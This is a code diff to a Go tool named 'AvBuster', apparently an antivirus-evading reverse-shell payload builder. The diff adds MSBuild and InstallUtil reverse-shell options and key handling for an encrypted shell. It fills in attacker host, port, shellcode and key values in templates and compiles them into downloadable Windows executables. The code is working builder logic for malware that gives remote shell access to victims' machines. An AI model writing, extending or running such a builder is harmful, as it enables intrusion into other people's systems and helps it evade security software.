@@ -6,6 +6,7 @@ import (
 	"compress/flate"
 	b64 "encoding/base64"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -62,11 +63,11 @@ func main() {
 
 	for choice != "0" {
 		gr.Println("1. TCP Normal Reverse Shell\t\t2. Hybrid Encrypted Reverse Shell")
-		gr.Println("3. HTTP Reverse Shell      \t\t4.Meterpreter HTTP Shell")
+		gr.Println("3. HTTP Reverse Shell      \t\t4. Meterpreter HTTP Shell")
 		gr.Println("5. HTTPS[Pinned] Reverse Shell     \t6. Meterpreter HTTPS Shell")
 		gr.Println("7. HTTPS[Self Signed] Reverse Shell\t8. PowerShell TCP Reverse Shell")
-		gr.Println("9. MS Build TCP Reverse Shell\t\t10. MS Xml Xslt TCP Reverse Shell")
-		gr.Println("11. InstallUtil TCP Reverse Shell\t12. MS ForFiles")
+		gr.Println("9. MS Build TCP Reverse Shell\t\t10. InstallUtil TCP Reverse Shell")
+		gr.Println("11. MS ForFiles\t\t")
 		rd.Printf("0. Exit\n")
 		bl.Printf("(AvBuster) > ")
 		//wht.Printf("Select Your Option $: ")
@@ -143,6 +144,20 @@ func main() {
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+		} else if choice == "9" {
+			//usrvals = readvalues(choice)
+			outpath = filepath.FromSlash("outfiles/msbuildrevtcp.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterMSBuildTCPReverseShell
+			go createavbusterpayload(usrvals, false, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+		} else if choice == "10" {
+			//usrvals = readvalues(choice)
+			outpath = filepath.FromSlash("outfiles/installutilrev.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterInstallShieldTCPReverseShell
+			go createavbusterpayload(usrvals, false, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
 		} else if choice == "7" {
 			outpath = filepath.FromSlash("outfiles/selfsignedhttps.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterSelfSignedHttps
@@ -172,7 +187,7 @@ func readvalues(choice string) UserValues {
 	ylw := color.New(color.FgHiYellow, color.Bold)
 	gr := color.New(color.FgHiGreen, color.Bold)
 	bl := color.New(color.FgHiBlue, color.Bold)
-	var fprint, selectedos, selectedarch, shellcode, lhost, lport string
+	var fprint, selectedos, selectedarch, shellcode, lhost, lport, pvtkey, pubkey string
 	actualusrvals := UserValues{}
 	if choice == "12" {
 		var printshelltype string
@@ -213,9 +228,17 @@ func readvalues(choice string) UserValues {
 			ylw.Printf("Cert Fingerprint : ")
 			fprint, _ = options.ReadString('\n')
 			fprint = removenewline(fprint)
-		}
-		if choice == "8" {
+		} else if choice == "8" {
 			selectedos = "windows"
+		} else if choice == "2" {
+			bl.Printf("(AvBuster) > ")
+			ylw.Printf("Private Key File Path : ")
+			pvtkey, _ = options.ReadString('\n')
+			pvtkey = removenewline(pvtkey)
+			bl.Printf("(AvBuster) > ")
+			ylw.Printf("Public Key File Path : ")
+			pubkey, _ = options.ReadString('\n')
+			pubkey = removenewline(pubkey)
 		} else {
 			bl.Printf("(AvBuster) > ")
 			ylw.Printf("OSTYPE : ")
@@ -250,6 +273,8 @@ func readvalues(choice string) UserValues {
 	actualusrvals.targetarchitecture = selectedarch
 	actualusrvals.fingerprint = fprint
 	actualusrvals.shellcode = shellcode
+	actualusrvals.privatekey = pvtkey
+	actualusrvals.publickey = pubkey
 
 	return actualusrvals
 }
@@ -383,7 +408,7 @@ func readandreplacefilecontent(ipport string) string {
 
 func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag chan string) {
 	var setpath, valuetowrite string
-	fmt.Println(userselectedval.saveas)
+	//fmt.Println(userselectedval.saveas)
 	if ismanager {
 		dwnloadlink.Link = "download/" + userselectedval.saveas + "manager" + ".exe"
 
@@ -399,13 +424,22 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag c
 	//fmt.Println(userselectedval.binarytemplate)
 	ipandport := userselectedval.lhost + ":" + userselectedval.lport
 	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
-	finalval := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
-	managerfinalval := strings.Replace(finalval, "REVPRT", userselectedval.lport, 1)
-
+	frpintreplaced := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
+	managerfinalval := strings.Replace(frpintreplaced, "REVPRT", userselectedval.lport, -1)
 	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
+	//fmt.Println(managerfinalval)
 	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
 	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
 	valuetowrite = strings.Replace(portreplaced, "SHELLCODE", userselectedval.shellcode, 1)
+
+	if strings.TrimSpace(userselectedval.privatekey) != "" &&
+		strings.TrimSpace(userselectedval.publickey) != "" {
+		getpvtkeycontents := readfilecontent(userselectedval.privatekey)
+		fmt.Println(getpvtkeycontents)
+		valuetowrite = strings.Replace(valuetowrite, "PVTKEY", getpvtkeycontents, 1)
+		getpubkeycontents := readfilecontent(userselectedval.publickey)
+		valuetowrite = strings.Replace(valuetowrite, "PUBKEY", getpubkeycontents, 1)
+	}
 
 	//fmt.Println(valuetowrite)
 
@@ -419,6 +453,14 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag c
 
 	avbusterbuildexe(dwnloadlink.Link, setpath, userselectedval.targetos, userselectedval.targetarchitecture)
 	finflag <- "build succeed"
+}
+
+func readfilecontent(fpath string) string {
+	contents, err := ioutil.ReadFile(fpath)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return (string(contents))
 }
 
 // creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
